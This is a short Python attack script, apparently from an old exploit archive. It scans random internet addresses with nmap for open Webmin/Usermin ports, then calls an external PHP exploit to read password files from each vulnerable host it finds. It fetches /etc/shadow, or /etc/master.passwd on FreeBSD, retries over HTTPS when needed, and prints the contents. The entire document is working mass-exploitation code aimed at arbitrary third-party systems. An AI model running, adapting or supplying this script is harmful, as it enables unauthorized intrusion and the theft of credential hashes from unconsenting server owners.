#!/usr/bin/python
#Uses nmap to scan random ips for open webmin/usermin
#ports then exploits them. Make sure to put "http://www.milw0rm.com/exploits/1997"
#in the same dir as this file or change line 20 to the proper dir.
#d3hydr8[at]gmail[dot]com

import commands, sys, getopt, StringIO, re, string

tmp, args = getopt.getopt(sys.argv[1:],"")
	
def rand_scan():

	tmp = args[0]
	port = ""
	
	nmapoutput = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -p 10000,20000 -iR 1')[1]).readlines()
	
	for tmp in nmapoutput:
		if re.search("10000/tcp\s+(?=open)", tmp):
			port = "10000"
		if re.search("20000/tcp\s+(?=open)", tmp):
			port = "20000"
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:
			ip = ipaddr[0]
	return ip, port
				   
def webminscan(ip, port, proto, file):

	webout = StringIO.StringIO(commands.getstatusoutput('php webmin.php '+ip+' '+port+' '+proto+' '+file+'')[1]).readlines()
	return webout

#................................................
	
if len(sys.argv) != 2:
	print "Usage: ./webmin_rand.py <How many ips would you like to scan?>"
	sys.exit(1)
else:
	num=sys.argv[1]
	
	print "\nScanning",num,"hosts for open ports to exploit...\n"
	count = 0
	while count != int(num):
		count += 1
		file = "/etc/shadow"
		proto = "http"
		ip, port = rand_scan()
		print "Searching:",ip
		if port == "10000" or port == "20000":
			output = webminscan(ip, port, proto, file)
		else:
			continue
		for line in output:
			if re.search("Error - File not found", line):
				freebsd = webminscan(ip, port, proto, file = "/etc/master.passwd")
				for line in freebsd:
					print "\a",line
			elif re.search("This web server is running in SSL mode.", line):
				proto = "https"
				ssl = webminscan(ip, port, proto, file) 
				for line in ssl:
					print "\a",line
			else:
				print "\a",line
				
		
